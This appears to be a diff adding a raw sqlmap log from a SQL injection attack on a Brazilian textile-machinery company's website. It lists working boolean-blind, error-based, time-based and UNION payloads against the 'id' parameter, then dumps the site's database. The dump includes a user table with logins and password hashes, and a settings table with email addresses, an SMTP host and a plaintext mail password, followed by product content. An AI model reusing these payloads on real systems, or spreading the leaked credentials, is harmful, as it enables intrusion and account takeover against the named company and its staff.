@@ -1,0 +1,385 @@
+sqlmap identified the following injection point(s) with a total of 50 HTTP(s) requests:
+---
+Parameter: id (GET)
+    Type: boolean-based blind
+    Title: AND boolean-based blind - WHERE or HAVING clause
+    Payload: id=83 AND 7415=7415
+    Vector: AND [INFERENCE]
+
+    Type: error-based
+    Title: MySQL >= 5.0 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (FLOOR)
+    Payload: id=83 AND (SELECT 7011 FROM(SELECT COUNT(*),CONCAT(0x717a767871,(SELECT (ELT(7011=7011,1))),0x716b6a7071,FLOOR(RAND(0)*2))x FROM INFORMATION_SCHEMA.PLUGINS GROUP BY x)a)
+    Vector: AND (SELECT [RANDNUM] FROM(SELECT COUNT(*),CONCAT('[DELIMITER_START]',([QUERY]),'[DELIMITER_STOP]',FLOOR(RAND(0)*2))x FROM INFORMATION_SCHEMA.PLUGINS GROUP BY x)a)
+
+    Type: AND/OR time-based blind
+    Title: MySQL >= 5.0.12 OR time-based blind
+    Payload: id=83 OR SLEEP(5)
+    Vector: OR [RANDNUM]=IF(([INFERENCE]),SLEEP([SLEEPTIME]),[RANDNUM])
+
+    Type: UNION query
+    Title: Generic UNION query (NULL) - 9 columns
+    Payload: id=83 UNION ALL SELECT CONCAT(0x717a767871,0x5a685979674557756e42534a6c5744456372456b6e6b746567726f426c757951516d5473456f6344,0x716b6a7071),NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL-- IQBN
+    Vector:  UNION ALL SELECT [QUERY],NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL[GENERIC_SQL_COMMENT]
+---
+web application technology: Apache
+back-end DBMS: MySQL >= 5.0
+available databases [2]:
+[*] brucebra_db
+[*] information_schema
+
+sqlmap resumed the following injection point(s) from stored session:
+---
+Parameter: id (GET)
+    Type: boolean-based blind
+    Title: AND boolean-based blind - WHERE or HAVING clause
+    Payload: id=83 AND 7415=7415
+    Vector: AND [INFERENCE]
+
+    Type: error-based
+    Title: MySQL >= 5.0 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (FLOOR)
+    Payload: id=83 AND (SELECT 7011 FROM(SELECT COUNT(*),CONCAT(0x717a767871,(SELECT (ELT(7011=7011,1))),0x716b6a7071,FLOOR(RAND(0)*2))x FROM INFORMATION_SCHEMA.PLUGINS GROUP BY x)a)
+    Vector: AND (SELECT [RANDNUM] FROM(SELECT COUNT(*),CONCAT('[DELIMITER_START]',([QUERY]),'[DELIMITER_STOP]',FLOOR(RAND(0)*2))x FROM INFORMATION_SCHEMA.PLUGINS GROUP BY x)a)
+
+    Type: AND/OR time-based blind
+    Title: MySQL >= 5.0.12 OR time-based blind
+    Payload: id=83 OR SLEEP(5)
+    Vector: OR [RANDNUM]=IF(([INFERENCE]),SLEEP([SLEEPTIME]),[RANDNUM])
+
+    Type: UNION query
+    Title: Generic UNION query (NULL) - 9 columns
+    Payload: id=83 UNION ALL SELECT CONCAT(0x717a767871,0x5a685979674557756e42534a6c5744456372456b6e6b746567726f426c757951516d5473456f6344,0x716b6a7071),NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL-- IQBN
+    Vector:  UNION ALL SELECT [QUERY],NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL[GENERIC_SQL_COMMENT]
+---
+web application technology: Apache
+back-end DBMS: MySQL >= 5.0
+Database: brucebra_db
+[20 tables]
++----------------------------+
+| tb_banners                 |
+| tb_buscas                  |
+| tb_categorianewsletter     |
+| tb_categorias              |
+| tb_conteudo                |
+| tb_dados                   |
+| tb_detalhes                |
+| tb_download                |
+| tb_eventos                 |
+| tb_galeriafotos            |
+| tb_metatags                |
+| tb_midia                   |
+| tb_newsletter              |
+| tb_previsaotempo           |
+| tb_representantes          |
+| tb_representantes_fotos    |
+| tb_representantes_segmento |
+| tb_showroom                |
+| tb_usuarios                |
+| tb_videos                  |
++----------------------------+
+
+sqlmap resumed the following injection point(s) from stored session:
+---
+Parameter: id (GET)
+    Type: boolean-based blind
+    Title: AND boolean-based blind - WHERE or HAVING clause
+    Payload: id=83 AND 7415=7415
+    Vector: AND [INFERENCE]
+
+    Type: error-based
+    Title: MySQL >= 5.0 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (FLOOR)
+    Payload: id=83 AND (SELECT 7011 FROM(SELECT COUNT(*),CONCAT(0x717a767871,(SELECT (ELT(7011=7011,1))),0x716b6a7071,FLOOR(RAND(0)*2))x FROM INFORMATION_SCHEMA.PLUGINS GROUP BY x)a)
+    Vector: AND (SELECT [RANDNUM] FROM(SELECT COUNT(*),CONCAT('[DELIMITER_START]',([QUERY]),'[DELIMITER_STOP]',FLOOR(RAND(0)*2))x FROM INFORMATION_SCHEMA.PLUGINS GROUP BY x)a)
+
+    Type: AND/OR time-based blind
+    Title: MySQL >= 5.0.12 OR time-based blind
+    Payload: id=83 OR SLEEP(5)
+    Vector: OR [RANDNUM]=IF(([INFERENCE]),SLEEP([SLEEPTIME]),[RANDNUM])
+
+    Type: UNION query
+    Title: Generic UNION query (NULL) - 9 columns
+    Payload: id=83 UNION ALL SELECT CONCAT(0x717a767871,0x5a685979674557756e42534a6c5744456372456b6e6b746567726f426c757951516d5473456f6344,0x716b6a7071),NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL-- IQBN
+    Vector:  UNION ALL SELECT [QUERY],NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL[GENERIC_SQL_COMMENT]
+---
+web application technology: Apache
+back-end DBMS: MySQL >= 5.0
+Database: brucebra_db
+Table: tb_usuarios
+[5 entries]
++-------------+-------------+-------------------------------------+------------+
+| de_Nome     | de_login    | de_senha                            | cd_usuario |
++-------------+-------------+-------------------------------------+------------+
+| welttec     | welttec     | a89e105asdb54283749d2bfc40bbb8cb166 | 3          |
+| José        | jose        | 728117df0370c6c229e43226627bd46a    | 4          |
+| Bruce       | bruce       | e8315caa4eb8c2a2625d4e97dbba100a    | 6          |
+| Thomas      | thomas      | ef6e65efc188e7dffd7335b646a85a21    | 7          |
+| brucebrasil | brucebrasil | 79b3c68eb50439720459c02716e2ac35    | 8          |
++-------------+-------------+-------------------------------------+------------+
+
+sqlmap resumed the following injection point(s) from stored session:
+---
+Parameter: id (GET)
+    Type: boolean-based blind
+    Title: AND boolean-based blind - WHERE or HAVING clause
+    Payload: id=83 AND 7415=7415
+    Vector: AND [INFERENCE]
+
+    Type: error-based
+    Title: MySQL >= 5.0 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (FLOOR)
+    Payload: id=83 AND (SELECT 7011 FROM(SELECT COUNT(*),CONCAT(0x717a767871,(SELECT (ELT(7011=7011,1))),0x716b6a7071,FLOOR(RAND(0)*2))x FROM INFORMATION_SCHEMA.PLUGINS GROUP BY x)a)
+    Vector: AND (SELECT [RANDNUM] FROM(SELECT COUNT(*),CONCAT('[DELIMITER_START]',([QUERY]),'[DELIMITER_STOP]',FLOOR(RAND(0)*2))x FROM INFORMATION_SCHEMA.PLUGINS GROUP BY x)a)
+
+    Type: AND/OR time-based blind
+    Title: MySQL >= 5.0.12 OR time-based blind
+    Payload: id=83 OR SLEEP(5)
+    Vector: OR [RANDNUM]=IF(([INFERENCE]),SLEEP([SLEEPTIME]),[RANDNUM])
+
+    Type: UNION query
+    Title: Generic UNION query (NULL) - 9 columns
+    Payload: id=83 UNION ALL SELECT CONCAT(0x717a767871,0x5a685979674557756e42534a6c5744456372456b6e6b746567726f426c757951516d5473456f6344,0x716b6a7071),NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL-- IQBN
+    Vector:  UNION ALL SELECT [QUERY],NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL[GENERIC_SQL_COMMENT]
+---
+web application technology: Apache
+back-end DBMS: MySQL >= 5.0
+Database: brucebra_db
+[20 tables]
++----------------------------+
+| tb_banners                 |
+| tb_buscas                  |
+| tb_categorianewsletter     |
+| tb_categorias              |
+| tb_conteudo                |
+| tb_dados                   |
+| tb_detalhes                |
+| tb_download                |
+| tb_eventos                 |
+| tb_galeriafotos            |
+| tb_metatags                |
+| tb_midia                   |
+| tb_newsletter              |
+| tb_previsaotempo           |
+| tb_representantes          |
+| tb_representantes_fotos    |
+| tb_representantes_segmento |
+| tb_showroom                |
+| tb_usuarios                |
+| tb_videos                  |
++----------------------------+
+
+Database: brucebra_db
+Table: tb_banners
+[2 entries]
++---------+--------------------+-----------+------------+
+| de_link | im_banner          | cd_banner | de_posicao |
++---------+--------------------+-----------+------------+
+| <blank> | 16244010122014.jpg | 7         | 2          |
+| <blank> | 16245910122014.jpg | 8         | 3          |
++---------+--------------------+-----------+------------+
+
+Database: brucebra_db
+Table: tb_buscas
+[0 entries]
++-------------+
+| dt_cadastro |
++-------------+
++-------------+
+
+Database: brucebra_db
+Table: tb_categorianewsletter
+[1 entry]
++--------------+--------------+
+| de_categoria | cd_categoria |
++--------------+--------------+
+| Newsletter   | 2            |
++--------------+--------------+
+
+Database: brucebra_db
+Table: tb_categorias
+[18 entries]
++--------+---------+----------------------------------+---------+----------+--------------+--------------+--------------------------------------------------+--------------+
+| parent | bo_Topo | de_foto                          | de_Link | nu_ordem | cd_linguagem | de_descricao | de_categoria                                     | cd_categoria |
++--------+---------+----------------------------------+---------+----------+--------------+--------------+--------------------------------------------------+--------------+
+| 0      | S       | <blank>                          | NULL    | 1        | 1            | <blank>      | M\xe1quinas T\xeaxteis                           | 29           |
+| 0      | S       | <blank>                          | NULL    | 1        | 1            | <blank>      | M\xe1quinas T\xeaxteis                           | 29           |
+| 29     | N       | 05559WD.jpg                      | NULL    | 1        | 1            | <blank>      | BRUCE - M\xe1q. de Costura                       | 45           |
+| 30     | NULL    | <blank>                          | NULL    | 1        | 1            | <blank>      | Otani - Pneu Radial de Carga                     | 32           |
+| 30     | NULL    | <blank>                          | NULL    | 1        | 1            | <blank>      | Otani - Pneu Radial de Carga                     | 32           |
+| 45     | N       | 0BRC-T3020_T2210_T1310.jpg       | NULL    | 1        | 1            | <blank>      | Filigrana Program\xe1vel                         | 58           |
+| 45     | N       | 0T20U43.jpg                      | NULL    | 1        | 1            | <blank>      | Outras M\xe1quinas                               | 79           |
+| 45     | N       | 0BRC-T3020_T2210_T1310.jpg       | NULL    | 1        | 1            | <blank>      | Filigrana Program\xe1vel                         | 58           |
+| 45     | N       | 0562DI.jpg                       | NULL    | 1        | 1            | NULL         | Galoneira                                        | 77           |
+| 45     | N       | 0BRC-9850DY.jpg                  | NULL    | 1        | 1            | NULL         | Reta                                             | 78           |
+| 45     | N       | 0T20U43.jpg                      | NULL    | 1        | 1            | NULL         | Outras M\xe1quinas                               | 79           |
+| 47     | NULL    | <blank>                          | NULL    | 1        | 1            | <blank>      | M\xe1quinas de Costura                           | 49           |
+| 47     | NULL    | <blank>                          | NULL    | 1        | 1            | <blank>      | M\xe1quinas de Costura                           | 49           |
+| 63     | N       | 0grava_cilindro_1.jpg            | NULL    | 1        | 1            | <blank>      | Grava\xe7\xe3o de Matrizes Rotativas (Cilindros) | 64           |
+| 63     | N       | 0grav_quadros_bluray.jpg         | NULL    | 1        | 1            | <blank>      | Grava\xe7\xe3o de Matrizes Planas (Quadros)      | 65           |
+| 66     | N       | 0maq_estamparia_rotativa.jpg     | NULL    | 1        | 1            | <blank>      | Estamparia Rotativa (CAIDIE)                     | 67           |
+| 66     | N       | 0maq_estamparia_localizada_1.jpg | NULL    | 1        | 1            | <blank>      | Estamparia Localizada                            | 68           |
+| 71     | N       | 0maq_corte_hy-h_1.jpg            | NULL    | 1        | 1            | <blank>      | Sistema de Corte Autom\xe1tico                   | 73           |
++--------+---------+----------------------------------+---------+----------+--------------+--------------+--------------------------------------------------+--------------+
+
+Database: brucebra_db
+Table: tb_conteudo
+[92 entries]
++---------------------+------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------+
+| dt_conteudo         | de_conteudo                                                                                                                                                                                                                                                                  |
++---------------------+------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------+
+| NULL                | NULL                                                                                                                                                                                                                                                                         |
+| NULL                | NULL                                                                                                                                                                                                                                                                         |
+| NULL                | NULL                                                                                                                                                                                                                                                                         |
+| NULL                | NULL                                                                                                                                                                                                                                                                         |
+| 2013-12-11 00:00:00 | <blank>                                                                                                                                                                                                                                                                      |
+| 2013-12-13 00:00:00 | <blank>                                                                                                                                                                                                                                                                      |
+| 2013-12-13 00:00:00 | <blank>                                                                                                                                                                                                                                                                      |
+| 2013-12-13 00:00:00 | <blank>                                                                                                                                                                                                                                                                      |
+| 2013-12-13 00:00:00 | <blank>                                                                                                                                                                                                                                                                      |
+| 2013-12-23 00:00:00 | <blank>                                                                                                                                                                                                                                                                      |
+| 2013-12-23 00:00:00 | <blank>                                                                                                                                                                                                                                                                      |
+| 2013-12-23 00:00:00 | <blank>                                                                                                                                                                                                                                                                      |
+| 2013-12-11 00:00:00 | <h2>O Grupo</h2>\r\n<p>Fundada em 2004 e com sede matriz na cidade de Pomerode no Estado de Santa Catarina, Link consolida no mercado nacional e internacional sua &eacute;tica, dinamismo e empreendedorismo, atribui&ccedil;\xf5es que despertam s\xf3lidas parcerias      |
+| 2013-12-11 00:00:00 | <h2>O Grupo</h2>\r\n<p>Fundada em 2004 e com sede matriz na cidade de Pomerode no Estado de Santa Catarina, Link consolida no mercado nacional e internacional sua &eacute;tica, dinamismo e empreendedorismo, atribui&ccedil;\xf5es que despertam s\xf3lidas parcerias      |
+| 2013-12-23 00:00:00 | <p class="BasicParagraph"><b>Caracter\xedsticas Ge                                                                                                                                                                                                                           |
+| 2013-12-23 00:00:00 | <p class="BasicParagraph"><b>Caracter\xedsticas</b                                                                                                                                                                                                                           |
+| 2013-12-26 00:00:00 | <p class="BasicParagraph"><b>Caracteristicas Gerais</b><b></b></p>\r\n<p class="BasicParagraph">• Velocid                                                                                                                                                                    |
+| 2013-12-23 00:00:00 | <p class="BasicParagraph"><b>Equipamento Padr\xe3o                                                                                                                                                                                                                           |
+| 2013-12-23 00:00:00 | <p class="BasicParagraph"><b>Funcionamento do Secador</b><b></b></p>\r\n<p class="BasicParagraph">O lodo &uacute;mido pode ser transportado at\xe9 o secador da                                                                                                              |
+| 2013-12-15 00:00:00 | <p class="BasicParagraph"><strong><span class="Textos">SPIN 0906</span></strong><span class="Textos"><span><o:p></o:p></span></span></p>\r\n<p class="BasicParagraph"><span class="Textos"><span>A</span></span><span class="Textos"><span> m\xe1quina</span></span><span cl |
+| 2013-12-13 00:00:00 | <p class="BasicParagraph"><strong>HSLC</strong></p>\r\n<p class="BasicParagraph">As m\xe1quinas da s&eacut                                                                                                                                                                   |
+| 2013-12-26 00:00:00 | <p class="BasicParagraph"><strong>HSLC</strong></p>\r\n<p class="BasicParagraph">As m\xe1quinas da s&eacut                                                                                                                                                                   |
+| 2013-12-26 00:00:00 | <p class="BasicParagraph">A s\xe9rie GGH da Feiya&                                                                                                                                                                                                                           |
+| 2013-12-15 00:00:00 | <p class="BasicParagraph">A s\xe9rie JG da Weltlas                                                                                                                                                                                                                           |
+| 2013-12-16 00:00:00 | <p class="BasicParagraph">A Welttec comercializa com exclusividade para o Brasil as M\xe1quinas de Tingi                                                                                                                                                                     |
+| 2013-12-16 00:00:00 | <p class="BasicParagraph">As m\xe1quinas Asiasun p                                                                                                                                                                                                                           |
+| 2013-12-16 00:00:00 | <p class="BasicParagraph">Equipamento para fabrica&ccedil;\xe3o de golas, barras, punhos e cachec&oacute                                                                                                                                                                     |
+| 2013-12-23 00:00:00 | <p class="BasicParagraph">M\xe1quina destinada &ag                                                                                                                                                                                                                           |
+| 2013-12-23 00:00:00 | <p class="BasicParagraph">Medida do m\xf3dulo: 2.2                                                                                                                                                                                                                           |
+| 2013-12-23 00:00:00 | <p class="BasicParagraph">O Sistema de corte autom&aacute;tico Weltcut \xe9 de alta performance e precis                                                                                                                                                                     |
+| 2013-12-23 00:00:00 | <p class="BasicParagraph">O Sistema de corte autom&aacute;tico Weltcut \xe9 de alta performance e precis                                                                                                                                                                     |
+| 2013-12-23 00:00:00 | <p class="BasicParagraph">O Sistema de corte autom&aacute;tico Weltcut \xe9 de alta performance e precis                                                                                                                                                                     |
+| 2013-12-16 00:00:00 | <p class="BasicParagraph">Os teares circulares da marca Hong Ji e Wellknit em parceria com a Welttec e M&aacute;quinas Isensee, foram tecnologicamente projetados (up grade) para o mercado brasileiro na fabrica&ccedil;\xe3o de malhas de alto padr\xe3o.</p>\r\n<p>&n     |
+| 2014-01-14 00:00:00 | <p class="Pa0">O cabe\xe7ote conjunto com o motor                                                                                                                                                                                                                            |
+| 2014-01-14 00:00:00 | <p><b>DESCRI\xc7\xc3O T\xc9CNICA DO PRODUT                                                                                                                                                                                                                                   |
+| 2014-01-14 00:00:00 | <p><b>DESCRI\xc7\xc3O T\xc9CNICA DO PRODUT                                                                                                                                                                                                                                   |
+| 2014-01-14 00:00:00 | <p><b>DESCRI\xc7\xc3O T\xc9CNICA DO PRODUT                                                                                                                                                                                                                                   |
+| 2014-01-14 00:00:00 | <p><b>DESCRI\xc7\xc3O T\xc9CNICA DO PRODUT                                                                                                                                                                                                                                   |
+| 2014-01-14 00:00:00 | <p><b>DESCRI\xc7\xc3O T\xc9CNICA DO PRODUT                                                                                                                                                                                                                                   |
+| 2014-01-16 00:00:00 | <p><b>DESCRI\xc7\xc3O T\xc9CNICA DO PRODUT                                                                                                                                                                                                                                   |
+| 2014-01-14 00:00:00 | <p><b>DESCRI\xc7\xc3O T\xc9CNICA DO PRODUT                                                                                                                                                                                                                                   |
+| 2014-01-14 00:00:00 | <p><b>DESCRI\xc7\xc3O T\xc9CNICA DO PRODUT                                                                                                                                                                                                                                   |
+| 2014-01-14 00:00:00 | <p><b>DESCRI\xc7\xc3O T\xc9CNICA DO PRODUT                                                                                                                                                                                                                                   |
+| 2014-01-14 00:00:00 | <p><b>DESCRI\xc7\xc3O T\xc9CNICA DO PRODUT                                                                                                                                                                                                                                   |
+| 2013-12-15 00:00:00 | <p><b>DESCRICAO T\xc9CNICA DO PRODUTO</b></p>\r\n<p>                                                                                                                                                                                                                         |
+| 2013-12-15 00:00:00 | <p><b>DESCRICAO T\xc9CNICA DO PRODUTO</b></p>\r\n<p>                                                                                                                                                                                                                         |
+| 2013-12-15 00:00:00 | <p><b>DESCRICAO T\xc9CNICA DO PRODUTO</b></p>\r\n<p>                                                                                                                                                                                                                         |
+| 2013-12-15 00:00:00 | <p><b>DESCRICAO T\xc9CNICA DO PRODUTO</b></p>\r\n<p>                                                                                                                                                                                                                         |
+| 2013-12-05 00:00:00 | <p><b>SERIEDADE OPORTUNIZA GRANDES PARCERIAS</b></p>\r\n<p>Bruce, fabricante de m\xe1quinas de costura, fo                                                                                                                                                                   |
+| 2013-12-06 00:00:00 | <p><span>A Welttec apoia projetos na \xe1rea da ed                                                                                                                                                                                                                           |
+| 2013-12-15 00:00:00 | <p><strong>BRC-798DIII/798DII/798DI</strong></p>\r\n<p><strong>Overlock de Alta Velocidade com Motor Direct-Drive</strong></p>\r\n<p><strong></strong>\xe9 um prod                                                                                                           |
+| 2013-12-15 00:00:00 | <p><strong>DESCRICAO TECNICA DO PRODUTO</strong></p>\r\n<p>M\xe1quina de costura industrial tipo caseado r                                                                                                                                                                   |
+| 2013-12-15 00:00:00 | <p><strong>DESCRICAO TECNICA DO PRODUTO</strong></p>\r\n<p>M\xe1quina de costura industrial tipo ponto fix                                                                                                                                                                   |
+| 2014-01-14 00:00:00 | <p>A BRC-T388 \xe9 uma m\xe1quina de costura r                                                                                                                                                                                                                               |
+| 2013-12-05 00:00:00 | <p>A Welttec foi fundada em 2006 e \xe9 especializ                                                                                                                                                                                                                           |
+| 2014-01-14 00:00:00 | <p>Aplicando tecnologia avan\xe7ada de direct-driv                                                                                                                                                                                                                           |
+| 2014-01-14 00:00:00 | <p>BRC-6380 \xe9 uma m\xe1quina de base plana.                                                                                                                                                                                                                               |
+| 2013-12-15 00:00:00 | <p>BRC-T3020TDQ \xe9 uma m\xe1quina pregadeira                                                                                                                                                                                                                               |
+| 2013-12-15 00:00:00 | <p>BRC-T6035 \xe9 uma m\xe1quina de filigrana                                                                                                                                                                                                                                |
+| NULL                |                                                                                                                                                                                                                                                                              |
+| NULL                |                                                                                                                                                                                                                                                                              |
+| NULL                |                                                                                                                                                                                                                                                                              |
+| NULL                |                                                                                                                                                                                                                                                                              |
+| NULL                |                                                                                                                                                                                                                                                                              |
+| NULL                |                                                                                                                                                                                                                                                                              |
+| NULL                |                                                                                                                                                                                                                                                                              |
+| 2013-12-06 00:00:00 | <p>Confira fotos, v\xeddeos e campanhas das empres                                                                                                                                                                                                                           |
+| 2014-01-21 00:00:00 | <p>Costura reta computadorizada, com motor direct drive de alta velocidade e painel integrado.</p>\r\n<p>&bull; Fun\xe7\xf5es</p>\r\n<p>\xa0 Corte Autom&aac                                                                                                                 |
+| 2013-12-15 00:00:00 | <p>Equipada com integra\xe7\xe3o mec\xe2nic                                                                                                                                                                                                                                  |
+| 2014-01-14 00:00:00 | <p>Esta \xe9 uma m\xe1quina com sistema de bar                                                                                                                                                                                                                               |
+| 2014-01-14 00:00:00 | <p>Esta m\xe1quina \xe9 especialmente desenhad                                                                                                                                                                                                                               |
+| 2014-01-14 00:00:00 | <p>Esta s\xe9rie adota o mecanismo de alimenta&cce                                                                                                                                                                                                                           |
+| 2014-01-14 00:00:00 | <p>Este motor tem as vantagens de alta efici\xeanci                                                                                                                                                                                                                          |
+| 2013-12-05 00:00:00 | <p>Fundada em 2004 e com sede matriz na cidade de Pomerode no Estado de Santa Catarina, link consolida no mercado nacional e internaciol sua \xe9tica, dinamis                                                                                                               |
+| 2014-01-14 00:00:00 | <p>M\xe1quina de corte com faca vertical, com afia                                                                                                                                                                                                                           |
+| 2013-12-15 00:00:00 | <p>M\xe1quina de costura industrial ponto fixo uma                                                                                                                                                                                                                           |
+| 2014-01-14 00:00:00 | <p>M\xe1quina de costura industrial tipo multi-agu                                                                                                                                                                                                                           |
+| 2014-01-14 00:00:00 | <p>M\xe1quina de costura ziguezague para tecidos m                                                                                                                                                                                                                           |
+| 2014-01-14 00:00:00 | <p>M\xe1quina de sacaria para costurar boca de div                                                                                                                                                                                                                           |
+| 2014-01-14 00:00:00 | <p>O dispositivo de corte de fim de enfesto da JK-TDB-3 pode mover-se automaticamente, a press\xe3o do g                                                                                                                                                                     |
+| 2013-12-06 00:00:00 | <p>O\xa0<strong>Grupo ENM</strong><strong>\xa0</st                                                                                                                                                                                                                           |
+| 2013-12-15 00:00:00 | <p>Os equipamentos galvonom\xe9tricos s\xe3o p                                                                                                                                                                                                                               |
+| 2013-12-06 00:00:00 | <p>Os pneus Tyrex s\xe3o exportados para mais de 5                                                                                                                                                                                                                           |
+| 2013-12-15 00:00:00 | BRC-797 tem muitas das vantagens da JK-798. Sendo uma m\xe1quina de base cil\xedndrica, possibilita,                                                                                                                                                                         |
+| 2013-12-15 00:00:00 | BRC-798T vem com um novo sistema de transporte superior que se move separadamente do transporte inferior. Com esta combina\xe7\xe3o de transportes e em co                                                                                                                   |
+| 2013-12-15 00:00:00 | BRC-T2210HSQ \xe9 uma m\xe1quina pregadeira de                                                                                                                                                                                                                               |
+| 2013-12-15 00:00:00 | BRC-T2210R \xe9 uma m\xe1quina de filigrana el                                                                                                                                                                                                                               |
+| 2013-12-15 00:00:00 | BRC-T5030 \xe9 uma m\xe1quina de filigrana ele                                                                                                                                                                                                                               |
+| 2013-12-15 00:00:00 | BRC-T5878 \xe9 uma m\xe1quina capaz de confecc                                                                                                                                                                                                                               |
+| 2013-12-15 00:00:00 | BRC-T5878-58D \xe9 uma m\xe1quina autom&aacute                                                                                                                                                                                                                               |
+| 2013-12-15 00:00:00 | BRC-T8010 \xe9 uma m\xe1quina de filigrana ele                                                                                                                                                                                                                               |
+| 2013-12-15 00:00:00 | M\xe1quina autom\xe1tica para costurar bolsos                                                                                                                                                                                                                                |
++---------------------+------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------+
+
+Database: brucebra_db
+Table: tb_dados
+[1 entry]
++---------+-----------+-----------+-----------+-----------------------------------+--------------------------+-------------------------+------------------+-------------------+--------------------+
+| id_dado | de_cidade | de_CEP    | de_estado | de_endereco                       | de_emailenvia            | de_emailrecebe          | de_nomtitlesite  | de_smtpemailenvia | de_senhaemailenvia |
++---------+-----------+-----------+-----------+-----------------------------------+--------------------------+-------------------------+------------------+-------------------+--------------------+
+| 1       |  Blumenau | 89015-400 | SC        | Rua Antônio Treis, 988 - Vorstadt | grupoenm@grupoenm.com.br | welttec@grupoenm.com.br | Pomerode On-line | smtp.gmail.com    | q2w0e1r3           |
++---------+-----------+-----------+-----------+-----------------------------------+--------------------------+-------------------------+------------------+-------------------+--------------------+
+
+Database: brucebra_db
+Table: tb_detalhes
+[5 entries]
++------------------------+
+| de_conteudo            |
++------------------------+
+| NULL                   |
+|                        |
+|                        |
+|                        |
+|                        |
++------------------------+
+
+Database: brucebra_db
+Table: tb_download
+[1 entry]
++---------------------+
+| dt_arquivo          |
++---------------------+
+| 2013-10-22 00:00:00 |
++---------------------+
+
+Database: brucebra_db
+Table: tb_eventos
+[17 entries]
++---------------------+--------------------------------------------------------------------------------------+
+| dt_evento           | de_evento                                                                            |
++---------------------+--------------------------------------------------------------------------------------+
+| 2013-08-22 00:00:00 | NULL                                                                                 |
+| 2013-08-22 00:00:00 | NULL                                                                                 |
+| 2013-08-22 00:00:00 | NULL                                                                                 |
+| 2013-08-22 00:00:00 | NULL                                                                                 |
+| 2013-08-22 00:00:00 | NULL                                                                                 |
+| 2013-08-22 00:00:00 | NULL                                                                                 |
+| 2013-08-22 00:00:00 | NULL                                                                                 |
+| 2013-08-22 00:00:00 | NULL                                                                                 |
+| 2013-08-22 00:00:00 | NULL                                                                                 |
+| 2013-08-22 00:00:00 | NULL                                                                                 |
+| 2013-08-22 00:00:00 | NULL                                                                                 |
+| 2013-08-22 00:00:00 | NULL                                                                                 |
+| 2013-08-22 00:00:00 | NULL                                                                                 |
+| 2013-08-22 00:00:00 | NULL                                                                                 |
+| 2013-08-22 00:00:00 | NULL                                                                                 |
+| 2013-08-22 00:00:00 | Circo biriba estreia sua nova pe\xe7a Biriba em concert Ingresso a venda na farmalan |
+| 2013-08-30 00:00:00 | Stand-up Comedy com Danilo Gentili                                                   |
++---------------------+--------------------------------------------------------------------------------------+
+
+Database: brucebra_db
+Table: tb_galeriafotos
+[1 entry]
++---------+------------+-------------+
+| bo_capa | cd_galeria | cd_conteudo |
++---------+------------+-------------+
+| NULL    | 61          |
++---------+------------+-------------+
+
